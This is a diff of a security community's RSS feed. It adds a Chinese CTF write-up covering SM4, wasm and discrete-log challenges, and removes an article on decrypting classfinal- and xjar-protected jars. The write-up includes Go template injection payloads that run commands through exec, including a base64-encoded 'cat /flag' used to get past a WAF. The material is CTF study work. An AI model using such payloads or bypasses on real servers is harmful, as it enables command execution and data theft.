+        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,
+        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279
+    ];
+    private static $SboxTable = [
+        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
+        0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
+        0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
+        0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
+        0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,
+        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
+        0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,
+        0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,
+        0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,
+        0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,
+        0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,
+        0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,
+        0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,
+        0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,
+        0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,
+        0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33
+    ];
+
+    public function __construct($key) {
+        $this-&amp;gt;setKey($key);
+    }
+    public function setKey($key) {
+        if (strlen($key) != 16) {
+            throw new Exception(&quot;SM4&quot;);
+        }
+        $key = $this-&amp;gt;strToIntArray($key);
+        $k = array_merge($key, [0, 0, 0, 0]);
+        for ($i = 0; $i &amp;lt; 4; $i++) {
+            $k[$i] ^= self::$FK[$i];
+        }
+        for ($i = 0; $i &amp;lt; 32; $i++) {
+            $k[$i + 4] = $k[$i] ^ $this-&amp;gt;CKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]);
+            $this-&amp;gt;sk[$i] = $k[$i + 4];
+        }
+    }
+    public function encrypt($plaintext) {
+        $len = strlen($plaintext);
+        $padding = 16 - ($len % 16);
+        $plaintext .= str_repeat(chr($padding), $padding); 
+        $ciphertext = &#39;&#39;;
+        for ($i = 0; $i &amp;lt; strlen($plaintext); $i += 16) {
+            $block = substr($plaintext, $i, 16);
+            $ciphertext .= $this-&amp;gt;cryptBlock($block, self::ENCRYPT);
+        }
+        return $ciphertext;
+    }
+    private function cryptBlock($block, $mode) {
+        $x = $this-&amp;gt;strToIntArray($block);
+
+        for ($i = 0; $i &amp;lt; 32; $i++) {
+            $roundKey = $this-&amp;gt;sk[$i];
+            $x[4] = $x[0] ^ $this-&amp;gt;F($x[1], $x[2], $x[3], $roundKey);
+            array_shift($x);
+        }
+        $x = array_reverse($x);
+        return $this-&amp;gt;intArrayToStr($x);
+    }
+    private function F($x1, $x2, $x3, $rk) {
+        return $this-&amp;gt;T($x1 ^ $x2 ^ $x3 ^ $rk);
+    }
+    private function CKF($a, $b, $c, $ck) {
+        return $a ^ $this-&amp;gt;T($b ^ $c ^ $ck);
+    }
+    private function T($x) {
+        return $this-&amp;gt;L($this-&amp;gt;S($x));
+    }
+    private function S($x) {
+        $result = 0;
+        for ($i = 0; $i &amp;lt; 4; $i++) {
+            $byte = ($x &amp;gt;&amp;gt; (24 - $i * 8)) &amp;amp; 0xFF;
+            $result |= self::$SboxTable[$byte] &amp;lt;&amp;lt; (24 - $i * 8);
+        }
+        return $result;
+    }
+    private function L($x) {
+        return $x ^ $this-&amp;gt;rotl($x, 2) ^ $this-&amp;gt;rotl($x, 10) ^ $this-&amp;gt;rotl($x, 18) ^ $this-&amp;gt;rotl($x, 24);
+    }
+    private function rotl($x, $n) {
+        return (($x &amp;lt;&amp;lt; $n) &amp;amp; 0xFFFFFFFF) | (($x &amp;gt;&amp;gt; (32 - $n)) &amp;amp; 0xFFFFFFFF);
+    }
+    private function strToIntArray($str) {
+        $result = [];
+        for ($i = 0; $i &amp;lt; 4; $i++) {
+            $offset = $i * 4;
+            $result[$i] =
+                (ord($str[$offset]) &amp;lt;&amp;lt; 24) |
+                (ord($str[$offset + 1]) &amp;lt;&amp;lt; 16) |
+                (ord($str[$offset + 2]) &amp;lt;&amp;lt; 8) |
+                ord($str[$offset + 3]);
+        }
+        return $result;
+    }
+    private function intArrayToStr($array) {
+        $str = &#39;&#39;;
+        foreach ($array as $int) {
+            $str .= chr(($int &amp;gt;&amp;gt; 24) &amp;amp; 0xFF);
+            $str .= chr(($int &amp;gt;&amp;gt; 16) &amp;amp; 0xFF);
+            $str .= chr(($int &amp;gt;&amp;gt; 8) &amp;amp; 0xFF);
+            $str .= chr($int &amp;amp; 0xFF);
+        }
+        return $str;
+    }
+}
+try {
+    $key = &quot;a8a58b78f41eeb6a&quot;;
+    $sm4 = new SM4($key);
+    $plaintext = &quot;flag&quot;;
+    $ciphertext = $sm4-&amp;gt;encrypt($plaintext);
+    echo  base64_encode($ciphertext) ; //VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu
+} catch (Exception $e) {
+    echo $e-&amp;gt;getMessage() ;
+}
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;hardtest&lt;/h2&gt;
+
+&lt;p&gt;Ai可以直接出，入口&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333343-550435-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;关键函数是sub_13E1 以及常量 byte_2120&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333377-740871-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;以及函数 sub_12A9、sub_1313、 sub_12DE 和常量 byte_2020&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333397-878743-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;这些关键的给 AI 就直接出结果了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333420-990850-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;Minigame&lt;/h2&gt;
+
+&lt;p&gt;考点： 微信小程序解包，map 文件解包，wasm 还原&lt;/p&gt;
+
+&lt;p&gt;是一个微信小程序用 wxapkg 解包 ，然后把解包得到的 chunk_0.appservice.js.map 再次解包&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333481-413990-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;可以发现核心在 utils/validator.js 中 ，在 util 目录发现了 validator.wasm ，然后通过工具 wasm-decompile&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;export memory a(initial: 258, max: 258); 
+data d_a(offset: 1024) = 
+ &quot;\ff\f5\f8\fe\e2\ff\f8\fc\a9\fb\ab\ae\fa\ad\ac\a8\fa\ae\ab\a1\a1\af\ae\f8&quot; 
+ &quot;\ac\af\ae\fc\a1\fa\a8\fb\fb\ad\fc\ac\aa\e4&quot;; 
+export function c(a:ubyte_ptr):int { // func0 
+ var e:int; 
+ var b:int_ptr; 
+ var d:int; 
+ var c:ubyte_ptr; 
+ if ({ 
+ d = a; 
+ if (eqz(d &amp;amp; 3)) goto B_c; 
+ 0; 
+ if (eqz(a[0])) goto B_a; 
+ loop L_d { 
+ a = a + 1; 
+ if (eqz(a &amp;amp; 3)) goto B_c; 
+ if (a[0]) continue L_d; 
+ } 
+ goto B_b; 
+ label B_c: 
+ loop L_e { 
+ b = a; 
+ a = b + 4; 
+ if ( 
+ ((16843008 - (e = b[0]) | e) &amp;amp; -2139062144) == -2139062144) continue L_e; 
+ } 
+ loop L_f { 
+ a = b; 
+ b = a + 1; 
+ if (a[0]) continue L_f; 
+ } 
+ label B_b: 
+ a - d; 
+ label B_a: 
+ } != 
+ 38) { 
+ return 0 
+ } 
+ loop L_h { 
+ a = c[1024] ^ (c + d)[0]:byte; 
+ b = a == 153; 
+ if (a != 153) goto B_i; 
+ c = c + 1; 
+ if (c != 38) continue L_h; 
+ label B_i: 
+ } 
+ return b; 
+} 
+export function b() { // func1 
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;把这两个代码给AI就可以直接得到 flag&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757333555-812601-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;h2&gt;Newtrick&lt;/h2&gt;
+
+&lt;p&gt;考点：对称加密算法和离散对数问题&lt;/p&gt;
+
+&lt;p&gt;由于有根据源码直接推出解密脚本&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;from hashlib import md5 
+from Crypto.Cipher import AES 
+p = 
+115792089237316195423570985008687907853269984665640564039457584007913129639
+747 
+F = GF(p) 
+Q = (123456789, 987654321, 135792468, 864297531) 
+N_Q = F(sum(x * x for x in Q)) 
+R = ( 
+ 
+535805042719399545796962826381600584293083019277531395431476058825743363271
+45, 
+799913182452098376229457194675627969511376052122949799764791997934539620908
+91, 
+531268698891810405870372104622761160960325946775601453062691481560347571601
+28, 
+973680242303063998595227832922465096998302542946496684346049712134964678571
+55 
+) 
+N_R = F(sum(x * x for x in R)) 
+try: 
+ secret = discrete_log(N_R, N_Q, bounds=(0, 2^50)) 
+ print(&quot;[+] Secret found:&quot;, secret) 
+except Exception as e: 
+ print(&quot;[-] discrete_log failed:&quot;, e) 
+ 
+ secret = 895942422329 
+key = md5(str(secret).encode()).digest() 
+cipher = AES.new(key, AES.MODE_ECB) 
+try: 
+ flag = cipher.decrypt(encrypted_flag) 
+ print(&quot;[+] Flag:&quot;, flag) 
+except Exception as e: 
+ print(&quot;[-] failed:&quot;, _e)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;SSTi模板注入，golang的SSTI，执行&lt;/p&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;{{.}}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;回显&lt;/p&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;p&gt;map[B64Decode:0x6ee380 exec:0x6ee120]&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;直接执行&lt;/p&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;{{exec &quot;id&quot;}}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757334370-533823-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;能够执行id，但是其余的其它命令基本都无法执行，猜测后端代码WAF拦截直接输出原字符串，尝试绕过WAF&lt;/p&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;{{B64Decode &quot;aGVsbG8=&quot;}}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;可以成功回显hello，直接使用B64Decode绕过，构造payload读取flag&lt;/p&gt;
+
+&lt;blockquote class=&quot;uncited&quot;&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;{{B64Decode &quot;Y2F0IC9mbGFn&quot; | exec}}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-09-08/1757334382-594303-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
+
+
+</description><link>https://zone.huoxian.cn/d/2995-2025writeup</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2995-2025writeup</guid><pubDate>Tue, 09 Sep 2025 01:36:25 GMT</pubDate><author>和</author><category>原创文章</category><category>应用安全</category><category>CTF</category></item><item><title>火线Zone 25年Q2季度技术文章奖励公示</title><description>&lt;p&gt;亲爱的火线Zone社区成员们，&lt;/p&gt;
 
 &lt;p&gt;自火线Zone征稿奖励方案启动以来，我们收到了众多技术专家的杰出投稿。这些高质量的原创技术文章不仅丰富了我们的社区知识库，也极大地促进了安全技术的交流与分享。在此，我们对所有积极参与的创作者表示衷心的感谢，并希望激励更多的技术专家加入我们的行列，共同推动技术安全生态的繁荣发展。&lt;/p&gt;
 
@@ -32,383 +1159,7 @@
 
 &lt;hr&gt;
 
-&lt;p&gt;版权声明： 本文内容由火线Zone社区原创发布，未经允许，不得转载或用于商业用途。如需转载，请遵守转载说明中的相关规定。&lt;/p&gt;</description><link>https://zone.huoxian.cn/d/2994-zone-25q2</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2994-zone-25q2</guid><pubDate>Wed, 02 Jul 2025 10:13:06 GMT</pubDate><author>小火子</author><category>官方公告</category></item><item><title>jar加解密探究</title><description>&lt;h1&gt;0、背景&lt;/h1&gt;
-&lt;p&gt;众所周知，jar 包反编译还原度较高，存在源代码泄露风险。常见的防护措施包括代码加密和混淆。今天我们重点研究代码加密方法，通常做法是对全部代码加密，程序运行时再加载密钥进行解密。&lt;/p&gt;
-
-&lt;h1&gt;1、classfinal&lt;/h1&gt;
-&lt;p&gt;classfinal是一个常见的开源加密项目，下载地址：&lt;br&gt;
-&lt;a href=&quot;https://gitee.com/roseboy/classfinal&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://gitee.com/roseboy/classfinal&lt;/a&gt;&lt;br&gt;
-打包好的jar下载：&lt;br&gt;
-&lt;a href=&quot;http://repo.maven.apache.org/maven2/net/roseboy/classfinal-fatjar/1.2.1/classfinal-fatjar-1.2.1.jar&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;http://repo.maven.apache.org/maven2/net/roseboy/classfinal-fatjar/1.2.1/classfinal-fatjar-1.2.1.jar&lt;/a&gt;&lt;/p&gt;
-
-&lt;h3&gt;1.1、加密验证&lt;/h3&gt;
-&lt;p&gt;（1）加密程序&lt;br&gt;
-我们可以用一个demo程序来测试加密命令：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt; java -jar classfinal-fatjar-1.2.1.jar -file demo-1.0-SNAPSHOT.jar -packages org.example -pwd 123456qq -Y&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;加密成功，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748854950-267739-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;（2）测试加密后的运行&lt;br&gt;
-有以下两种方式：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;1、直接指定密码启动（密码会显示在命令历史中，不够安全）：
-java -javaagent:demo-1.0-SNAPSHOT-encrypted.jar=&#39;-pwd yourpassword&#39; -jar demo-1.0-SNAPSHOT-encrypted.jar
-
-
-2、推荐方式 - 启动后输入密码（更安全）：
-java -javaagent:demo-1.0-SNAPSHOT-encrypted.jar -jar demo-1.0-SNAPSHOT-encrypted.jar&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;运行正常，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855024-869696-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h3&gt;1.2、测试逆向&lt;/h3&gt;
-&lt;p&gt;（1）对比加解密区别&lt;br&gt;
-对比发现直接使用反编译工具已经无法看到方法的具体实现&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855069-227356-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;（2）定位到解密方法与密码的hash&lt;br&gt;
-net/roseboy/classfinal/JarDecryptor.class&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855077-802532-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h3&gt;1.3、解密&lt;/h3&gt;
-&lt;p&gt;作者提到，加密保护的关键在于密钥存储。无论是命令行直接输入还是手动输入密钥，最终客户都需要获得密钥。一般项目不太可能每次启动都由代码提供方协助。当前解密操作默认已获取项目密钥。&lt;br&gt;
-（1）思路：&lt;br&gt;
-我们了解到项目使用AES加密，拿到密钥后，直接用加密jar包的解密方法传入密钥即可完成解密，然后把解密后的内容保存到磁盘即可。&lt;br&gt;
-（2）实操&lt;br&gt;
-将jar先解压到root文件夹下，然后同目录运行脚本即可&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855093-904288-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;（3）解密对比&lt;br&gt;
-对比加密前和解密后的代码，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855101-316785-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;（4）解密代码&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;import net.roseboy.classfinal.JarDecryptor;
-import java.io.File;
-import net.roseboy.classfinal.util.IoUtils;
-
-
-public class test {
-    public static void main(String[] args) {
-
-//        1.将加密jar包解压到当前目录下的ROOT目录下
-        String workpath = System.getProperty(&quot;user.dir&quot;) + &quot;/ROOT/&quot;;
-
-//        2.输入密码
-        String pass = &quot;123456qq&quot;;
-
-
-        File file = new File(workpath+&quot;META-INF/.classes/&quot;);
-        File[] array = file.listFiles();
-        for(int i=0;i&amp;lt;array.length;i++){
-            if(array[i].isFile()){
-                JarDecryptor jarde = new JarDecryptor();
-                byte[] result = jarde.doDecrypt(workpath,array[i].getName(),pass.toCharArray());
-
-//               判断返回值是否为空
-                if (result == null) {
-                    System.out.println(&quot;解密失败，输出为空: &quot; + array[i].getName());
-                    continue;
-                }
-
-//                解密写入文件
-                String decrypted_path = System.getProperty(&quot;user.dir&quot;)+&quot;/decodes/&quot;;
-                File decrypted_dir = new File(decrypted_path);
-                if (!decrypted_dir.exists()) {
-                    decrypted_dir.mkdirs();
-                }
-
-                File outputFile = new File(decrypted_dir, array[i].getName() + &quot;.class&quot;);
-                IoUtils.writeFile(outputFile, result);
-
-//                输出写入的文件位置
-                System.out.println(&quot;解密成功，输出文件: &quot; + outputFile.getAbsolutePath());
-
-            }
-        }
-    }
-}&lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;1.4、补充&lt;/h3&gt;
-&lt;p&gt;其实classfinal在加密的时候，是可以选择不指明密码。&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855119-337129-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;加密测试，&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855185-60451-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;这种方式会随机生成一个密码，保存位置见下图，反编译后可以获取。&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855191-301534-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h1&gt;2、小结&lt;/h1&gt;
-&lt;p&gt;由于启动密码泄露主要由保存方式不当导致，我们可以考虑用Go编写一个专用启动器来管理启动密码，从而提高安全性。不过需要注意，启动器不能直接通过 system 等函数启动项目，否则密码仍可能通过 ps -ef 等命令被获取。实际上，类似的开源项目已有实现，可以进一步参考和研究。&lt;/p&gt;
-&lt;h1&gt;3、xjar&lt;/h1&gt;
-&lt;p&gt;下载地址：&lt;br&gt;
-&lt;a href=&quot;https://github.com/core-lib/xjar&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/core-lib/xjar&lt;/a&gt;&lt;/p&gt;
-&lt;h3&gt;3.1、加密验证&lt;/h3&gt;
-&lt;p&gt;（1）添加依赖&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855258-410345-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;    &amp;lt;!-- 设置 jitpack.io 仓库 --&amp;gt;
-    &amp;lt;repositories&amp;gt;
-        &amp;lt;repository&amp;gt;
-            &amp;lt;id&amp;gt;jitpack.io&amp;lt;/id&amp;gt;
-            &amp;lt;url&amp;gt;https://jitpack.io&amp;lt;/url&amp;gt;
-        &amp;lt;/repository&amp;gt;
-    &amp;lt;/repositories&amp;gt;
-
-    &amp;lt;!-- 添加 XJar 依赖 --&amp;gt;
-    &amp;lt;dependencies&amp;gt;
-        &amp;lt;dependency&amp;gt;
-            &amp;lt;groupId&amp;gt;com.github.core-lib&amp;lt;/groupId&amp;gt;
-            &amp;lt;artifactId&amp;gt;xjar&amp;lt;/artifactId&amp;gt;
-            &amp;lt;version&amp;gt;4.0.2&amp;lt;/version&amp;gt;
-            &amp;lt;!-- &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt; --&amp;gt;
-        &amp;lt;/dependency&amp;gt;
-    &amp;lt;/dependencies&amp;gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;（2）加密&lt;br&gt;
-同时生成启动器go的代码&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855273-393282-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;package org.example;
-
-import io.xjar.XCryptos;
-
-
-public class xjar_en {
-
-    public static void main(String[] args) throws Exception {
-        // Spring-Boot Jar包加密
-        XCryptos.encryption()
-                .from(&quot;target/demo-1.0-SNAPSHOT.jar&quot;)//是需要加密的jar包路径（也可以使用绝对路径）
-                .use(&quot;123456ww&quot;)//是加密的秘钥
-                .include(&quot;/**/*.class&quot;)
-                .include(&quot;/**/*.yml&quot;)
-                .include(&quot;/**/*.xml&quot;)
-                .exclude(&quot;/static/**/*&quot;)
-                .exclude(&quot;/templates/**/*&quot;)
-                .exclude(&quot;/META-INF/resources/**/*&quot;)
-                .to(&quot;target/demo-1.0-SNAPSHOT-encrypted-xjar.jar&quot;);//加密后的jar包的存放路径
-    }
-
-}&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;（3）生成启动器与启动项目&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855295-50810-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# 编译“启动器”
-go build xjar.go
- 
-# 使用启动器启动
-.\xjar.exe java -jar .\demo-1.0-SNAPSHOT-encrypted-xjar.jar&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855312-901964-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;h3&gt;3.2、测试逆向&lt;/h3&gt;
-&lt;p&gt;（1）尝试反编译&lt;br&gt;
-代码直接无法查看&lt;br&gt;
-&lt;img src=&quot;https://huoxian-community.oss-cn-beijing.aliyuncs.com/2025-06-02/1748855319-730052-image.png&quot; title=&quot;&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
-
-&lt;p&gt;（2）查看启动器逻辑&lt;br&gt;
-项目重点是启动器和密钥。Go 代码中，发现密钥通过 Stdin 传递。&lt;br&gt;
-安全检测方面：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;通过哈希校验加密 jar 包，防止篡改；&lt;/li&gt;
-&lt;li&gt;检查命令行参数，若包含 -javaagent: 则直接报错退出，防止通过 Java Agent 注入；&lt;/li&gt;
-&lt;li&gt;将包含算法、密钥长度、IV 长度和密码的密钥字节流，作为 Java 程序标准输入传递。&lt;br&gt;
-xjar.go代码
-&lt;pre&gt;&lt;code&gt;package main
-
-import (
-	&quot;bytes&quot;
-	&quot;crypto/md5&quot;
-	&quot;crypto/sha1&quot;
-	&quot;errors&quot;
-	&quot;hash&quot;
-	&quot;io&quot;
-	&quot;os&quot;
-	&quot;os/exec&quot;
-	&quot;path/filepath&quot;
-	&quot;strings&quot;
-)
-
-var xJar = XJar{
-	md5:  []byte{9, 15, 233, 88, 9, 60, 80, 217, 189, 204, 223, 35, 62, 229, 255, 80},
-	sha1: []byte{63, 97, 90, 64, 90, 144, 174, 79, 13, 192, 250, 105, 89, 114, 78, 133, 4, 170, 2, 30},
-}
-
-var xKey = XKey{
-	algorithm: []byte{65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100, 100, 105, 110, 103},
-	keysize:   []byte{49, 50, 56},
-	ivsize:    []byte{49, 50, 56},
-	password:  []byte{49, 50, 51, 52, 53, 54, 119, 119},
-}
-
-func main() {
-	// search the jar to start
-	jar, err := JAR(os.Args)
-	if err != nil {
-		panic(err)
-	}
-
-	// parse jar name to absolute path
-	path, err := filepath.Abs(jar)
-	if err != nil {
-		panic(err)
-	}
-
-	// verify jar with MD5
-	MD5, err := MD5(path)
-	if err != nil {
-		panic(err)
-	}
-	if bytes.Compare(MD5, xJar.md5) != 0 {
-		panic(errors.New(&quot;invalid jar with MD5&quot;))
-	}
-
-	// verify jar with SHA-1
-	SHA1, err := SHA1(path)
-	if err != nil {
-		panic(err)
-	}
-	if bytes.Compare(SHA1, xJar.sha1) != 0 {
-		panic(errors.New(&quot;invalid jar with SHA-1&quot;))
-	}
-
-	// check agent forbid
-	{
-		args := os.Args
-		l := len(args)
-		for i := 0; i &amp;lt; l; i++ {
-			arg := args[i]
-			if strings.HasPrefix(arg, &quot;-javaagent:&quot;) {
-				panic(errors.New(&quot;agent forbidden&quot;))
-			}
-		}
-	}
-
-	// start java application
-	java := os.Args[1]
-	args := os.Args[2:]
-	key := bytes.Join([][]byte{
-		xKey.algorithm, {13, 10},
-		xKey.keysize, {13, 10},
-		xKey.ivsize, {13, 10},
-		xKey.password, {13, 10},
-	}, []byte{})
-	cmd := exec.Command(java, args...)
-	cmd.Stdin = bytes.NewReader(key)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	err = cmd.Run()
-	if err != nil {
-		panic(err)
-	}
-}
-
-// find jar name from args
-func JAR(args []string) (string, error) {
-	var jar string
-
-	l := len(args)
